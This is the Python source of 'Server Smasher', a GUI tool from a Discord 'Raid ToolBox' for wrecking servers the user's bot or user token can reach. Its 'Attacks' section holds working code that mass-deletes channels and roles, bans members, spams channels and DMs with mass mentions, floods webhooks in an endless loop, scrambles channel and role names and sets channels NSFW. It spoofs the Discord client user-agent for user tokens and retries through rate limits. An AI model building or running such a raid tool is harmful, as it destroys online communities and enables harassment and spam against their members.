#!/usr/bin/env python3
# Raid ToolBox Server Smasher GUI
# Author: DeadBread76 - https://github.com/DeadBread76/
# Original Server Smasher: Synchronocy - https://github.com/synchronocy
# Date: 13th August 2019
#
# Copyright (c) 2019, DeadBread
#
# Permission to use, copy, modify, and/or distribute this software for any
# purpose with or without fee is hereby granted, provided that the above
# copyright notice and this permission notice appear in all copies.
#
# THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
# WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
# SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
# WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN ACTION
# OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
# CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

import os, sys, json, ast, time, random, string, asyncio, base64
import discord, requests, pyperclip
import PySimpleGUIQt as sg
from pprint import pprint
from base64 import b64encode
from collections import namedtuple
from concurrent.futures import ThreadPoolExecutor

smversion = "1.0.0a"

with open('./config.json', 'r') as handle:
    config = json.load(handle)
    token_list = config['token_list']
    thread_count = config['thread_count']

with open('RTBFiles/ServerSmasher/smconfig.json', 'r') as handle:
    config = json.load(handle)
    last_used = config['last_used']
    last_used_type = config['last_used_type']
    bots_cached = config['bots_cached']
    users_cached = config['users_cached']
    bot_token_cache = config['bot_token_cache']
    user_token_cache = config['user_token_cache']

executor = ThreadPoolExecutor(max_workers=thread_count)
loop = asyncio.get_event_loop()
client = discord.Client()
theme = ast.literal_eval(sys.argv[1])
guild_cache = None

if theme['use_custom_theme']:
    sg.SetOptions(background_color=theme['background_color'],
                 text_element_background_color=theme['text_element_background_color'],
                 element_background_color=theme['element_background_color'],
                 scrollbar_color=theme['scrollbar_color'],
                 input_elements_background_color=theme['input_elements_background_color'],
                 input_text_color=theme['input_text_color'],
                 button_color=theme['button_colour'],
                 text_color=theme['text_color'])
else:
    sg.ChangeLookAndFeel(theme['preset_theme'])

if not os.path.exists("./tokens/smtokens.txt"):
    with open("./tokens/smtokens.txt", "a+") as handle:
        pass
usertokenlist = open("./tokens/"+token_list).read().splitlines()
bottokenlist = open("./tokens/smtokens.txt").read().splitlines()
token_overide = None
type_overide = None
cache_guilds = []

#  _              _        ___
# | |   ___  __ _(_)_ _   / __| __ _ _ ___ ___ _ _
# | |__/ _ \/ _` | | ' \  \__ \/ _| '_/ -_) -_) ' \
# |____\___/\__, |_|_||_| |___/\__|_| \___\___|_||_|
#           |___/

def check_user(type, token):
    global bot_token_cache
    global user_token_cache
    if type == "Bot":
        headers = {'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}
    elif type == "User":
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
    src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
    if src.status_code == 401:
        pass
    else:
        response = json.loads(src.content)
        if type == "Bot":
            bot_token_cache[f'{response["username"]}#{response["discriminator"]}'] = token
        elif type == "User":
            user_token_cache[f'{response["username"]}#{response["discriminator"]}'] = token

def login_serversmasher():
    global token
    global client_type
    global last_used
    global last_used_type
    global bottokenlist
    global usertokenlist
    global bot_token_cache
    global user_token_cache
    global bot_token_cache
    global token_overide
    global type_overide
    global headers
    if token_overide is not None:
        default_token = token_overide
    elif len(last_used) > 1:
        default_token = last_used
    else:
        default_token = ""
    if type_overide is not None:
        default_type = type_overide
    elif last_used_type == "User":
        default_type = last_used_type
    else:
        default_type = "Bot"
    layout = [
             [sg.Text("Welcome To Server Smasher!", size=(45,1), font='Any 12', key="TITLE")],
             [sg.Combo(['Bot','User'], readonly=True, key="Type", size=(5,0.7), default_value=default_type), sg.Input(default_token, do_not_clear=True, focus=True, key="TOKEN", size=(45,0.8)), sg.Button("Login", size=(7,0.8))],
             [sg.Button("Use user token list", key="ToggleuserList", size=(28.5, 0.6)), sg.Button("Use bot token list (smtokens.txt)", key="TogglebotList", size=(28.5, 0.6))],
             ]
    window = sg.Window("DeadBread's Server Smasher v{}".format(smversion), resizable=False).Layout(layout)
    while True:
        event, values = window.Read(timeout=100)
        if event is None:
            sys.exit()
        elif event == sg.TIMEOUT_KEY:
            try:
                if values["Type"] == "User":
                    window.Element('TITLE').Update("USING A USER TOKEN IS NOT RECOMMENDED!")
                else:
                    window.Element('TITLE').Update("Welcome To Server Smasher!")
            except:
                pass

        elif event == "TogglebotList":
            window.Close()
            if not bots_cached:
                sg.PopupNonBlocking("Please wait a moment, Loading token names.", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
                bot_token_cache = {}
                with ThreadPoolExecutor(max_workers=thread_count) as ex:
                    for bot in bottokenlist:
                        ex.submit(check_user, "Bot", bot)
                with open('RTBFiles/ServerSmasher/smconfig.json', 'r+') as handle:
                    edit = json.load(handle)
                    edit['bots_cached'] = True
                    edit['bot_token_cache'] = bot_token_cache
                    handle.seek(0)
                    json.dump(edit, handle, indent=4)
                    handle.truncate()
            if len(list(bot_token_cache)) == 0:
                botlist = [None]
            else:
                botlist = list(bot_token_cache)
            layout = [
                     [sg.Text("Select a Bot to use.", size=(15,0.7)), sg.Text("", size=(11,0.8)), sg.Button("Go Back", key="Back", size=(11,0.8))],
                     [sg.Combo(botlist, size=(15,0.7), key="BotToken"), sg.Button("Select Bot", size=(11,0.8), key="SelectBot"), sg.Button("Refresh Cache", key="Refresh Bots", size=(11,0.8))]
                     ]
            window1 = sg.Window("DeadBread's Server Smasher v{}".format(smversion), resizable=False).Layout(layout)
            window = window1

        elif event == "ToggleuserList":
            window.Close()
            if not users_cached:
                sg.PopupNonBlocking("Please wait a moment, Loading token names.", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
                user_token_cache = {}
                with ThreadPoolExecutor(max_workers=thread_count) as ex:
                    for user in usertokenlist:
                        ex.submit(check_user, "User", user)
                with open('RTBFiles/ServerSmasher/smconfig.json', 'r+') as handle:
                    edit = json.load(handle)
                    edit['users_cached'] = True
                    edit['user_token_cache'] = user_token_cache
                    handle.seek(0)
                    json.dump(edit, handle, indent=4)
                    handle.truncate()
            if len(list(user_token_cache)) == 0:
                userlist = [None]
            else:
                userlist = list(user_token_cache)
            layout = [
                     [sg.Text("Select a User to use.", size=(15,0.7)), sg.Text("", size=(11,0.8)), sg.Button("Go Back", key="Back", size=(11,0.8))],
                     [sg.Combo(userlist, size=(15,0.7), key="UserToken"), sg.Button("Select User", size=(11,0.8), key="SelectUser"), sg.Button("Refresh Cache", key="Refresh Users", size=(11,0.8))]
                     ]
            window1 = sg.Window("DeadBread's Server Smasher v{} | User Tokens".format(smversion), resizable=False).Layout(layout)
            window = window1

        elif event == 'Refresh Bots':
            window.Close()
            sg.PopupNonBlocking("Please wait a moment, Loading token names.", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
            bot_token_cache = {}
            with ThreadPoolExecutor(max_workers=thread_count) as ex:
                for bot in bottokenlist:
                    ex.submit(check_user, "Bot", bot)
            with open('RTBFiles/ServerSmasher/smconfig.json', 'r+') as handle:
                edit = json.load(handle)
                edit['bots_cached'] = True
                edit['bot_token_cache'] = bot_token_cache
                handle.seek(0)
                json.dump(edit, handle, indent=4)
                handle.truncate()
            if len(list(bot_token_cache)) == 0:
                botlist = [None]
            else:
                botlist = list(bot_token_cache)
            layout = [
                     [sg.Text("Select a Bot to use.", size=(15,0.7)), sg.Text("", size=(11,0.8)), sg.Button("Go Back", key="Back", size=(11,0.8))],
                     [sg.Combo(botlist, size=(15,0.7), key="BotToken"), sg.Button("Select Bot", size=(11,0.8), key="SelectBot"), sg.Button("Refresh Cache", key="Refresh Bots", size=(11,0.8))]
                     ]
            window1 = sg.Window("DeadBread's Server Smasher v{}".format(smversion), resizable=False).Layout(layout)
            window = window1

        elif event == 'Refresh Users':
            window.Close()
            sg.PopupNonBlocking("Please wait a moment, Loading token names.", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
            user_token_cache = {}
            with ThreadPoolExecutor(max_workers=thread_count) as ex:
                for user in usertokenlist:
                    ex.submit(check_user, "User", user)
            with open('RTBFiles/ServerSmasher/smconfig.json', 'r+') as handle:
                edit = json.load(handle)
                edit['users_cached'] = True
                edit['user_token_cache'] = user_token_cache
                handle.seek(0)
                json.dump(edit, handle, indent=4)
                handle.truncate()
            if len(list(user_token_cache)) == 0:
                userlist = [None]
            else:
                userlist = list(user_token_cache)
            layout = [
                     [sg.Text("Select a User to use.", size=(15,0.7)), sg.Text("", size=(11,0.8)), sg.Button("Go Back", key="Back", size=(11,0.8))],
                     [sg.Combo(userlist, size=(15,0.7), key="UserToken"), sg.Button("Select User", size=(11,0.8), key="SelectUser"), sg.Button("Refresh Cache", key="Refresh Users", size=(11,0.8))]
                     ]
            window1 = sg.Window("DeadBread's Server Smasher v{} | User Tokens".format(smversion), resizable=False).Layout(layout)
            window = window1

        elif event == "Back":
            if token_overide is not None:
                default_token = token_overide
            elif len(last_used) > 1:
                default_token = last_used
            else:
                default_token = ""
            if type_overide is not None:
                default_type = type_overide
            elif last_used_type == "User":
                default_type = last_used_type
            else:
                default_type = "Bot"
            layout = [
                     [sg.Text("Welcome To Server Smasher!", size=(45,1), font='Any 12', key="TITLE")],
                     [sg.Combo(['Bot','User'], readonly=True, key="Type", size=(5,0.7), default_value=default_type), sg.Input(default_token, do_not_clear=True, focus=True, key="TOKEN", size=(45,0.8)), sg.Button("Login", size=(7,0.8))],
                     [sg.Button("Use user token list", key="ToggleuserList", size=(28.5, 0.6)), sg.Button("Use bot token list (smtokens.txt)", key="TogglebotList", size=(28.5, 0.6))],
                     ]
            window1 = sg.Window("DeadBread's Server Smasher v{}".format(smversion), resizable=False).Layout(layout)
            window.Close()
            window = window1

        elif event == "SelectBot":
            token_overide = bot_token_cache[values['BotToken']]
            type_overide = "Bot"
            sg.PopupNonBlocking(f"Token set to {values['BotToken']}", keep_on_top=True)
            if token_overide is not None:
                default_token = token_overide
            elif len(last_used) > 1:
                default_token = last_used
            else:
                default_token = ""
            if type_overide is not None:
                default_type = type_overide
            elif last_used_type == "User":
                default_type = last_used_type
            else:
                default_type = "Bot"
            layout = [
                     [sg.Text("Welcome To Server Smasher!", size=(45,1), font='Any 12', key="TITLE")],
                     [sg.Combo(['Bot','User'], readonly=True, key="Type", size=(5,0.7), default_value=default_type), sg.Input(default_token, do_not_clear=True, focus=True, key="TOKEN", size=(45,0.8)), sg.Button("Login", size=(7,0.8))],
                     [sg.Button("Use user token list", key="ToggleuserList", size=(28.5, 0.6)), sg.Button("Use bot token list (smtokens.txt)", key="TogglebotList", size=(28.5, 0.6))],
                     ]
            window1 = sg.Window("DeadBread's Server Smasher v{}".format(smversion), resizable=False).Layout(layout)
            window.Close()
            window = window1

        elif event == "SelectUser":
            token_overide = user_token_cache[values['UserToken']]
            type_overide = "User"
            sg.PopupNonBlocking(f"Token set to {values['UserToken']}", keep_on_top=True)
            if token_overide is not None:
                default_token = token_overide
            elif len(last_used) > 1:
                default_token = last_used
            else:
                default_token = ""
            if type_overide is not None:
                default_type = type_overide
            elif last_used_type == "User":
                default_type = last_used_type
            else:
                default_type = "Bot"
            layout = [
                     [sg.Text("Welcome To Server Smasher!", size=(45,1), font='Any 12', key="TITLE")],
                     [sg.Combo(['Bot','User'], readonly=True, key="Type", size=(5,0.7), default_value=default_type), sg.Input(default_token, do_not_clear=True, focus=True, key="TOKEN", size=(45,0.8)), sg.Button("Login", size=(7,0.8))],
                     [sg.Button("Use user token list", key="ToggleuserList", size=(28.5, 0.6)), sg.Button("Use bot token list (smtokens.txt)", key="TogglebotList", size=(28.5, 0.6))],
                     ]
            window1 = sg.Window("DeadBread's Server Smasher v{}".format(smversion), resizable=False).Layout(layout)
            window.Close()
            window = window1

        elif event == 'Login':
            window.Close()
            sg.PopupNonBlocking("Logging into Token...", title="Please Wait", auto_close=True, keep_on_top=True, auto_close_duration=1)
            token = values['TOKEN']
            client_type = values['Type']
            last_used = values['TOKEN']
            last_used_type = values['Type']
            with open('RTBFiles/ServerSmasher/smconfig.json', 'r+') as handle:
                edit = json.load(handle)
                edit['last_used'] = last_used
                edit['last_used_type'] = last_used_type
                handle.seek(0)
                json.dump(edit, handle, indent=4)
                handle.truncate()
            if client_type == 'Bot':
                headers={'Authorization': f'Bot {token}', 'Content-Type': 'application/json'}
            else:
                headers={'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            start_client()

#    _  _   _           _
#   /_\| |_| |_ __ _ __| |__ ___
#  / _ \  _|  _/ _` / _| / /(_-<
# /_/ \_\__|\__\__,_\__|_\_\/__/
def deletechannel(channel):
    while True:
        src = requests.delete(f"https://canary.discordapp.com/api/v6/channels/{channel}", headers=headers)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def removeban(server,user):
    while True:
        src = requests.delete(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/bans/{str(user)}", headers=headers)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def deleterole(role,server):
    while True:
        src = requests.delete(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/roles/{str(role)}", headers=headers)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def createrole(name,server):
    payload = {'hoist': 'true', 'name': name, 'mentionable': 'true', 'color': random.randint(1000000,9999999), 'permissions': random.randint(1,10)}
    while True:
        src = requests.post(f'https://canary.discordapp.com/api/v6/guilds/{str(server)}/roles', headers=headers, json=payload)
        if src.status_code == 429:
            time.sleep(3)
        else:
            break

def senddmtouser(user,content,usetts):
    dmlist = []
    payload = {'recipient_id': user}
    src = requests.post('https://canary.discordapp.com/api/v6/users/@me/channels', headers=headers, json=payload)
    userdm = src.content.decode()
    jsonstring = json.loads(userdm).values()
    for x in jsonstring:
        dmlist.append(x)
    userdm = dmlist[2]
    payload = {"content" : content, "tts" : usetts, "mention_everyone" : "true"}
    while True:
        src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{userdm}/messages", headers=headers, json=payload)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def banuser(user,server,banreason):
    while True:
        src = requests.put(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/bans/{str(user)}?delete-message-days=7&reason={banreason}", headers=headers)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def createchannel(server,channelname,channeltype):
    payload = {'name': channelname, 'type': channeltype}
    while True:
        src = requests.post(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/channels", headers=headers,json=payload)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def sendspam(channel,msgcontent,usetts):
    payload = {"content": msgcontent, "tts": usetts}
    while True:
        src = requests.post(f"https://canary.discordapp.com/api/v6/channels/{channel}/messages", headers=headers, json=payload)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def mover(server,user,channel):
    payload = {'channel_id': str(channel)}
    while True:
        src = requests.patch(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/members/{str(user)}", headers=headers,json=payload)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def massnick(server,user,nick):
    payload = {'nick': str(nick)}
    while True:
        src = requests.patch(f"https://canary.discordapp.com/api/v6/guilds/{str(server)}/members/{str(user)}", headers=headers,json=payload)
        if src.status_code == 429:
            time.sleep(5)
        else:
            break

def removeemoji(server,emoji):
    while True:
        src = requests.delete(f'https://canary.discordapp.com/api/v6/guilds/{str(server)}/emojis/{str(emoji)}',headers=headers)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def addemoji(server,encoded,name): # This has pretty huge rate limits, be careful using it.
    payload = {'image': encoded, 'name': name}
    while True:
        src = requests.post(f'https://canary.discordapp.com/api/v6/guilds/{str(server)}/emojis',headers=headers,json=payload)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def corrupt_channel(channelid,channame):
    corruptchanname = ''
    for x in channame:
        if random.randint(1,2) == 1:
            corruptchanname += asciigen(1)
        else:
            corruptchanname += x
    payload = {'name': corruptchanname}
    while True:
        src = requests.patch(f'https://canary.discordapp.com/api/v6/channels/{channelid}', headers=headers,json=payload)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def corrupt_role(serverid,roleid,rolename):
    corruptrolename = ''
    for x in rolename:
        if random.randint(1,2) == 1:
            corruptrolename += asciigen(1)
        else:
            corruptrolename += x
    payload = {'name': corruptrolename}
    while True:
        src = requests.patch(f'https://canary.discordapp.com/api/v6/guilds/{serverid}/roles/{roleid}', headers=headers,json=payload)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def nsfwchannel(channelid):
    payload = {'nsfw': 'true'}
    while True:
        src = requests.patch(f'https://canary.discordapp.com/api/v6/channels/{channelid}', headers=headers,json=payload)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def topicedit(channelid,newtopic):
    payload = {'topic': newtopic}
    while True:
        src = requests.patch(f'https://canary.discordapp.com/api/v6/channels/{channelid}', headers=headers,json=payload)
        if src.status_code == 429:
            time.sleep(1)
        else:
            break

def webhook_spam(webhook,content):
    if content == 'asc':
        content = asciigen(1999)
    payload = {'content': content}
    while True:
        requests.post(webhook, json=payload)


#  ___             _   _
# | __|  _ _ _  __| |_(_)___ _ _  ___
# | _| || | ' \/ _|  _| / _ \ ' \(_-<
# |_| \_,_|_||_\__|\__|_\___/_||_/__/
def get_user(user):
    src = requests.get(f'https://canary.discordapp.com/api/v6/users/{user}', headers=headers)
    user_json = json.loads(src.content)
    user = namedtuple('User', sorted(user_json.keys()))(**user_json)
    return user

def get_user_info():
    src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
    user_json = json.loads(src.content)
    user = namedtuple('User', sorted(user_json.keys()))(**user_json)
    return user

def get_guild_threaded(guild):
    global cache_guilds
    del cache_guilds
    cache_guilds = []
    roles = []
    emojis = []
    members = []
    channels = []
    overwrites = []
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}', headers=headers)
    guild_response = json.loads(src.content)
    for role in guild_response['roles']:
        roles.append(namedtuple('Role', sorted(role.keys()))(**role))
    for emoji in guild_response['emojis']:
        emojis.append(namedtuple('Emoji', sorted(emoji.keys()))(**emoji))
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/members?limit=1000', headers=headers)
    response = json.loads(src.content)
    for member in response:
        member['user'] = namedtuple('User', sorted(member['user'].keys()))(**member['user'])
        members.append(namedtuple('Member', sorted(member.keys()))(**member))
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/channels', headers=headers)
    channels_json = json.loads(src.content)
    for channel in channels_json:
        for overwrite in channel['permission_overwrites']:
            overwrites.append(namedtuple('Permission_Overwrite', sorted(overwrite.keys()))(**overwrite))
        channel['permission_overwrites'] = overwrites
        channels.append(namedtuple('Channel', sorted(channel.keys()))(**channel))
    guild_response['roles'] = roles
    guild_response['emojis'] = emojis
    guild_response['members'] = members
    guild_response['channels'] = channels
    guild = namedtuple('Guild', sorted(guild_response.keys()))(**guild_response)
    cache_guilds.append(guild)

def create_cache():
    global cache_guilds
    src = requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers)
    response_json = json.loads(src.content)
    with ThreadPoolExecutor(max_workers=thread_count) as exe:
        for guild in response_json:
            exe.submit(get_guild_threaded, guild['id'])
    return cache_guilds

def get_client_guilds():
    guilds = []
    src = requests.get('https://canary.discordapp.com/api/v6/users/@me/guilds', headers=headers)
    response_json = json.loads(src.content)
    for guild in response_json:
        guilds.append(get_guild(guild['id']))
    return guilds

def get_guild(guild):
    roles = []
    emojis = []
    members = []
    channels = []
    overwrites = []
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}', headers=headers)
    guild_response = json.loads(src.content)
    for role in guild_response['roles']:
        roles.append(namedtuple('Role', sorted(role.keys()))(**role))
    for emoji in guild_response['emojis']:
        emojis.append(namedtuple('Emoji', sorted(emoji.keys()))(**emoji))
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/members?limit=1000', headers=headers)
    response = json.loads(src.content)
    for member in response:
        member['user'] = namedtuple('User', sorted(member['user'].keys()))(**member['user'])
        members.append(namedtuple('Member', sorted(member.keys()))(**member))
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/channels', headers=headers)
    channels_json = json.loads(src.content)
    for channel in channels_json:
        for overwrite in channel['permission_overwrites']:
            overwrites.append(namedtuple('Permission_Overwrite', sorted(overwrite.keys()))(**overwrite))
        channel['permission_overwrites'] = overwrites
        channels.append(namedtuple('Channel', sorted(channel.keys()))(**channel))
    guild_response['roles'] = roles
    guild_response['emojis'] = emojis
    guild_response['members'] = members
    guild_response['channels'] = channels
    guild = namedtuple('Guild', sorted(guild_response.keys()))(**guild_response)
    return guild

def get_guild_channels(guild):
    channels = []
    overwrites = []
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/channels', headers=headers)
    channels_json = json.loads(src.content)
    for channel in channels_json:
        for overwrite in channel['permission_overwrites']:
            overwrites.append(namedtuple('Permission_Overwrite', sorted(overwrite.keys()))(**overwrite))
        channel['permission_overwrites'] = overwrites
        channels.append(namedtuple('Channel', sorted(channel.keys()))(**channel))
    return channels

def get_guild_roles(guild):
    roles = []
    src = requests.get(f'https://canary.discordapp.com/api/v6/guilds/{guild}/roles', headers=headers)
    role_json = json.loads(src.content)
    for role in role_json:
        roles.append(namedtuple('Role', sorted(role.keys()))(**role))
    return roles

def create_invite(channel):
    payload = {"max_age": 0}
    src = requests.post(f'https://canary.discordapp.com/api/v6/channels/{channel}/invites', headers=headers, json=payload)
    invite_json = json.loads(src.content)
    invite = namedtuple('Invite', sorted(invite_json.keys()))(**invite_json)
    return invite

def create_guild(name):
    payload = {"name": name}
    src = requests.post(f'https://canary.discordapp.com/api/v6/guilds', headers=headers, json=payload)
    return src

def leave_guild(guild):
    requests.delete(f'https://canary.discordapp.com/api/v6/users/@me/guilds/{guild}', headers=headers)
    return None

def edit_profile(name, avatar):
    if avatar == "New Avatar...":
        payload = {'username': name}
    else:
        with open(avatar, "rb") as handle:
            encoded = bytes_to_base64_data(handle.read())
        payload = {'avatar': encoded, 'username': name}
    src = requests.patch('https://canary.discordapp.com/api/v6/users/@me', headers=headers, json=payload)
    return src

def construct_avatar_link(id, hash, size):
    link = f"https://cdn.discordapp.com/avatars/{id}/{hash}.png?size={size}"
    return link

def update_cache():
    global user_cache
    global guild_cache
    guild_cache = get_client_guilds()
    user_cache = get_user_info()

def asciigen(length):
    asc = ''
    for x in range(int(length)):
        num = random.randrange(13000)
        asc = asc + chr(num)
    return asc

def gen(size=6, chars=string.ascii_uppercase + string.digits + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))

def get_mime(data):  # From Discord.py
    if data.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
        return 'image/png'
    elif data[6:10] in (b'JFIF', b'Exif'):
        return 'image/jpeg'
    elif data.startswith((b'\x47\x49\x46\x38\x37\x61', b'\x47\x49\x46\x38\x39\x61')):
        return 'image/gif'
    elif data.startswith(b'RIFF') and data[8:12] == b'WEBP':
        return 'image/webp'

def bytes_to_base64_data(data):  # From Discord.py
    fmt = 'data:{mime};base64,{data}'
    mime = get_mime(data)
    b64 = b64encode(data).decode('ascii')
    return fmt.format(mime=mime, data=b64)

#   ___       _   _               ___  _    _   _
#  / _ \ _ __| |_(_)___ _ _  ___ |   \(_)__| |_(_)___ _ _  __ _ _ _ _  _
# | (_) | '_ \  _| / _ \ ' \(_-< | |) | / _|  _| / _ \ ' \/ _` | '_| || |
#  \___/| .__/\__|_\___/_||_/__/ |___/|_\__|\__|_\___/_||_\__,_|_|  \_, |
#       |_|                                                         |__/
smasheroptions = {
    'namechange': '',
    'servname': '',
    'iconbegone': False,
    'changeicon': False,
    'iconfile': '',
    'rembans': False,
    'chandel': False,
    'roledel': False,
    'userban': False,
    'banreason': "",
    'userid': "",
    'senddm': False,
    'dmcontent': "",
    'createchan': False,
    'chanmethod': "asc",
    'channame': "",
    'channelno': 100,
    'usespam': False,
    'spammethod': "massment",
    'usetts': False,
    'customtxt': "",
    'gimmieadmin': False,
    'me': "",
    'giveeveryoneadmin': False,
    'createroles': False,
    'crolecount': 100,
    'rolesname': "",
    'custrolename': "",
    'deleteemojis': False,
    'createemojis': False,
    'emojipath': "",
    'emojinum': 10
    }

#  ___               _              __  __
# / __|_ __  __ _ __| |_  ___ _ _  |  \/  |___ _ _ _  _
# \__ \ '  \/ _` (_-< ' \/ -_) '_| | |\/| / -_) ' \ || |
# |___/_|_|_\__,_/__/_||_\___|_|   |_|  |_\___|_||_\_,_|
def main_menu():
    global guild_cache
    global user_cache
    global avatar_b64
    del guild_cache
    guild_cache = create_cache()
    user = user_cache
    guilds = guild_cache
    server_dict = {}
    usercount = 0
    for guild in guilds:
        usercount += len(guild.members)
        server_dict[guild.name] = guild.id
    if len(list(server_dict)) == 0:
        server_dict = {"None": "None"}
    user_frame = [
                 [sg.Image(data_base64=avatar_b64)],
                 [sg.Text(f"{user.username}#{user.discriminator}, ({user.id})", font='Any 11')],
                 [sg.Button("Logout"), sg.Button("Refresh")]
                 ]
    server_frame = [
                   [sg.Combo(list(server_dict), size=(20,0.7), key="ServerID"), sg.Button("Select Server", size=(9,0.8)), sg.Button("Leave Server", size=(9,0.8)),]
                   ]
    options_frame = [
                    [sg.Button(f"Change {client_type} Options")],
                    [sg.Input("Server Name", key="NewServerName"), sg.Button("Create Server")],
                    [sg.Input(f"https://discordapp.com/api/oauth2/authorize?client_id={user.id}&permissions=8&scope=bot")]
                    ]
    layout = [
             [sg.Frame('Logged in to Server Smasher as:', user_frame, font='Any 12', title_color=theme['text_color'])],
             [sg.Frame(f"{client_type} is in {len(guilds)} Servers ({usercount} members total.)", server_frame, font='Any 10', title_color=theme['text_color'])],
             [sg.Frame("Other Options", options_frame, font='Any 10', title_color=theme['text_color'])]
             ]
    window = sg.Window("DeadBread's Server Smasher v{}".format(smversion), resizable=False, keep_on_top=True).Layout(layout)
    while True:
        event, values = window.Read()
        if event is None:
            sys.exit()
        elif event == "Select Server":
            if values["ServerID"] == "None":
                pass
            else:
                window.Close()
                sg.PopupNonBlocking("Loading Server, Please Wait", keep_on_top=True, auto_close=True, auto_close_duration=1)
                server_menu(server_dict[values["ServerID"]])
        elif event == "Logout":
            window.Close()
            login_serversmasher()
        elif event == "Refresh":
            sg.PopupNonBlocking("Updating Cache...", auto_close=True, auto_close_duration=1, keep_on_top=True)
            guild_cache = create_cache()
            user = user_cache
            guilds = guild_cache
            server_dict = {}
            usercount = 0
            for guild in guilds:
                usercount += len(guild.members)
                server_dict[guild.name] = guild.id
            if len(list(server_dict)) == 0:
                server_dict = {"None": "None"}
            user_frame = [
                         [sg.Image(data_base64=avatar_b64)],
                         [sg.Text(f"{user.username}#{user.discriminator}, ({user.id})", font='Any 11')],
                         [sg.Button("Logout"), sg.Button("Refresh")]
                         ]
            server_frame = [
                           [sg.Combo(list(server_dict), size=(20,0.7), key="ServerID"), sg.Button("Select Server", size=(9,0.8)), sg.Button("Leave Server", size=(9,0.8)),]
                           ]
            options_frame = [
                            [sg.Button(f"Change {client_type} Options")],
                            [sg.Input("Server Name", key="NewServerName"), sg.Button("Create Server")],
                            [sg.Input(f"https://discordapp.com/api/oauth2/authorize?client_id={user.id}&permissions=8&scope=bot")]
                            ]
            layout = [
                     [sg.Frame('Logged in to Server Smasher as:', user_frame, font='Any 12', title_color=theme['text_color'])],
                     [sg.Frame(f"{client_type} is in {len(guilds)} Servers ({usercount} members total.)", server_frame, font='Any 10', title_color=theme['text_color'])],
                     [sg.Frame("Other Options", options_frame, font='Any 10', title_color=theme['text_color'])]
                     ]
            window1 = sg.Window("DeadBread's Server Smasher v{}".format(smversion), resizable=False, keep_on_top=True).Layout(layout)
            window.Close()
            window = window1
        elif event == "Leave Server":
            e = sg.PopupYesNo(f"Are you sure you want to leave {values['ServerID']}", keep_on_top=True)
            if e == "Yes":
                window.Close()
                leave_guild(values["ServerID"])
                main_menu()
            else:
                pass
        elif event == "Create Server":
            window.Close()
            create_guild(values["NewServerName"])
            sg.PopupNonBlocking("Updating Cache...", auto_close=True, auto_close_duration=1, keep_on_top=True)
            main_menu()
        elif event == "Change Bot Options":
            option_frame = [
                           [sg.Input("New Avatar...", key="NewAvatarBot", size=(15,0.7)), sg.FileBrowse(file_types=(("PNG Files", "*.png"),("JPG Files", "*.jpg"),("JPEG Files", "*.jpeg"),("GIF Files", "*.gif"),("WEBM Files", "*.webm")))],
                           [sg.Input(user.username, key="NewBotName", size=(15,0.7)), sg.Text(f"#{user.discriminator}")]
                           ]
            layout = [
                     [sg.Frame("Bot Options", option_frame, font='Any 10', title_color=theme['text_color'])],
                     [sg.Button("Save Changes"), sg.Button("Back")]
                     ]
            window1 = sg.Window("DeadBread's Server Smasher v{}".format(smversion), resizable=False, keep_on_top=True).Layout(layout)
            window.Close()
            window = window1
        elif event == "Save Changes":
            sg.PopupNonBlocking("Saving Changes...", auto_close=True, auto_close_duration=1, keep_on_top=True)
            edit_profile(values["NewBotName"], values["NewAvatarBot"])
        elif event == "Back":
            window.Close()
